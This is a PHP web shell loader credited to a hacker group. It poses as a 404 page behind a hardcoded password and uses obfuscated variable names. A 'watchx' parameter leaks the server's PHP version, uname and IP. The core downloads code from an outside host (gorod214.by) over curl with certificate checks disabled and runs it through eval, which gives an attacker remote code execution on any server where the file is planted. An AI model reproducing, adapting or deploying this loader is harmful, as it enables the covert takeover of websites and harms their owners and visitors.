<?php

/*
// Author : Kira
// Team   : BSSA Badan Sundanese Agency
// Email  : info@bssa.gov.id
*/
set_time_limit(0);
error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "jal8";
$link = "fvck.txt";
if ($_POST['password'] == $pass) {
    $_SESSION['forbidden'] = $pass;
}
if ($_GET['page'] == "blank") {
    echo "<a href='?'>Back</a>";
    exit;
}
if (isset($_REQUEST['logout'])) {
    session_destroy();
}
if (!$_SESSION['forbidden']) {
    ?>
<!DOCTYPE html>
<html>
<head>
<title>-=[404 Not Found]=-</title>
<meta name="theme color" content="#00BFFF"> </meta>
<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
<script type="text/JavaScript">
function killCopy(e){
return false
}
function reEnable(){
return true
}
document.onselectstart=new Function ("return false")
if (window.sidebar){
document.onmousedown=killCopy
document.onclick=reEnable
}
</script>
<link href="https://fonts.googleapis.com/css?family=Rye" rel="stylesheet">
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
  <body bgcolor="black">
	<center><img src="https://i.gifer.com/XOsX.gif" style="opacity:0.5; width:500px; height:500px";></center></center>
	<center><h1><center><font color="#ff0000" face="Rye">-=[ BSSA Badan Siber Sundanese Agency ]=-</font><br>
	</center>
	<form method="post">
		<input type="password" name="password" placeholder="Password">
		<input type="submit" value="MASUK!">
		<br>
		<br>
		<?php 
    echo $_SESSIOM['forbidden'];
    ?>
		</form>
		  </td>
		 </table>
    </center>
  </body>
</html>
<?php 
    exit;
}



$GLOBALS["lnrkdexmo"] = "result";
$GLOBALS["fcgthfemb"] = "a";
$GLOBALS["kmnpcocuqa"] = "ch";
$GLOBALS["nqusfcueqf"] = "version";
$GLOBALS["mluhaqb"] = "ip";
$GLOBALS["ltnbuthggrc"] = "a";
error_reporting(0);
ini_set("display_errors", 0);
if ($_REQUEST["watchx"]) {
    $wfmjlpuc = "ip";
    $GLOBALS["kumviinoca"] = "version";
    $twcfypprtyn = "uname";
    $version = phpversion();
    $GLOBALS["tvefrhpr"] = "uname";
    $uname = php_uname();
    $ip = gethostbyname($_SERVER["HTTP_HOST"]);
    echo json_encode(array("version" => $version, "uname" => $uname, "platform" => PHP_OS, "ip" => $ip, "workingx" => true));
    die;
}
function get_contents($url)
{
    $wyeeuqehxtz = "ch";
    ${$GLOBALS["kmnpcocuqa"]} = curl_init("{$url}");
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_RETURNTRANSFER, 1);
    $GLOBALS["oxuwprq"] = "ch";
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt(${$wyeeuqehxtz}, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; 32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_SSL_VERIFYHOST, 0);
    $GLOBALS["cbtslil"] = "ch";
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_COOKIEJAR, $GLOBALS["coki"]);
    curl_setopt(${$GLOBALS["kmnpcocuqa"]}, CURLOPT_COOKIEFILE, $GLOBALS["coki"]);
    ${$GLOBALS["lnrkdexmo"]} = curl_exec($ch);
    return ${$GLOBALS["lnrkdexmo"]};
}
${$GLOBALS["ltnbuthggrc"]} = get_contents("https://gorod214.by/img/r/2da30f");

eval("?>" . ${$GLOBALS["fcgthfemb"]});

